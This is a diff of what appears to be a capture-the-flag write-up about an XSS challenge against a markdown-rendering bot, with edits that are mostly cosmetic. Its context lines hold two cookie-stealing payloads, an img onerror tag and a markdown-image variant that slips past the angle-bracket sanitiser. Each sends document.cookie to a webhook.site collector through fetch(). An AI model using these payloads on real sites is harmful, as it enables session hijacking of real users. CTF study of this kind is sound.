@@ -37,7 +37,8 @@ To do a simple xss attack you can do
 <img src = "x" onerror = "fetch('https://webhook.site/?c=' + encodeURIComponent(document.cookie))">
 ```
 We will pass the payload to the bot by putting it in the markdown parameter.
-But wait, take a look at the web pages backend.
+
+BUT WAIT, take a look at the web pages backend:
 ```js
 const sanitize = (unsafe) => unsafe.replaceAll("<", "＜").replaceAll(">", "＞");
 
@@ -69,10 +70,12 @@ app.get("/render", async (req, reply) => {
   return { escaped, unescaped };
 });
 ```
-Our payload will undergo sanitisation, as well as become parsed through **marked.parse(markdown)**
+Our payload will undergo sanitisation, as well as become parsed through **marked.parse(markdown)**!!
+
 *<span style="font-size: 12px">As our input undergoes escapeHTML but then immediately undergoes unescapeHTML, we can ignore it. </span>*
 
 We will have to change the format of our payload to **Markdown format**
+
 ```js
 ![x" onerror="fetch('https://webhook.site/.../?c='+encodeURIComponent(document.cookie))" z="](x)
 ```
